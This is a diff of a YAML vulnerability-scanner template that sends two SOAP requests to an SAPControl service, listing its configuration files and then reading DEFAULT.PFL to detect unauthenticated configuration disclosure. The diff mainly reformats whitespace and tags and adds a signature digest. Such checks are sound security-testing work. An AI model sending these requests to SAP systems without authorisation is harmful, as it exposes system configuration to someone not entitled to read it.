@@ -1,5 +1,4 @@
 id: sap-readconfig-disclosure
-
 info:
   name: SAPControl Read DEFAULT.PFL - Disclosure
   author: LRVT,l4rm4nd
@@ -14,10 +13,8 @@ info:
     - https://community.sap.com/t5/technology-blog-posts-by-members/securing-the-sap-instance-agent-sap-start-service/ba-p/13486679
   metadata:
     max-request: 1
-  tags: sap,sapcontrol,soap,config,disclosure
-
+  tags: config,disclosure,sap,sapcontrol,soap
 flow: http(1) && http(2)
-
 http:
   - raw:
       - |
@@ -37,7 +34,6 @@ http:
             <ns1:ListConfigFiles xmlns:ns1="urn:SAPControl"/>
           </SOAP-ENV:Body>
         </SOAP-ENV:Envelope>
-
     matchers:
       - type: word
         part: body
@@ -46,7 +42,6 @@ http:
           - "<configfiles>"
         condition: and
         internal: true
-
     extractors:
       - type: regex
         name: default_pfl
@@ -55,7 +50,6 @@ http:
         regex:
           - '<item>([^<]*DEFAULT\.PFL[^<]*)</item>'
         internal: true
-
   - raw:
       - |
         POST / HTTP/1.1
@@ -76,7 +70,6 @@ http:
             </ns1:ReadConfigFile>
           </SOAP-ENV:Body>
         </SOAP-ENV:Envelope>
-
     matchers:
       - type: word
         part: body
@@ -84,8 +77,7 @@ http:
           - "ReadConfigFileResponse"
           - "<lines>"
         condition: and
-
       - type: status
         status:
           - 200
-
+        # digest: 490a00463044022014a2b5063751bc36a86999c76ffb4bce5039d9ddc124689d362d4117a3178d9102203bfd835363ece36e7f7f374be8eb075997257bc1a4d9fa7cdc47063f2ab34c7a:922c64590222798bb761d5b6d8e72950
